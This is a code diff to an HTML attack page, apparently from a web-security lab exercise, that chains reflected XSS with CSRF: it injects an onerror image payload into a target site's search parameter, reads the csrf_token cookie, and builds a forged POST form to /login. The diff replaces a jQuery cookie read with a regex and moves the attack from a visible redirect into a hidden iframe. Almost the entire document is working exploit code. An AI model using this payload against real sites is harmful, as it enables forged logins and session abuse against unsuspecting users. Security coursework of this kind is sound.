@@ -1,10 +1,11 @@
 <html>
 <body>
-<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+<iframe id="attack_frame" style="display:none;"></iframe>
+
 <script>
 var payload = [
-  "var token = $.cookie('csrf_token');",
+  "var match = document.cookie.match(new RegExp('(^| )csrf_token=([^;]+)'));",
+  "var token = match ? match[2] : '';", 
   "var form = document.createElement('form');",
   "form.method = 'POST';",
   "form.action = '/login?csrfdefense=1&xssdefense=0';",
@@ -16,7 +17,9 @@ var payload = [
 ].join(" ");
 
 var xss = '<img src=x onerror="' + payload + '">';
-window.location = 'https://elecos432.org/search?xssdefense=0&q=' + encodeURIComponent(xss);
+
+var targetUrl = 'https://elecos432.org/search?csrfdefense=1&xssdefense=0&q=' + encodeURIComponent(xss);
+document.getElementById('attack_frame').src = targetUrl;
 </script>
 </body>
 </html>
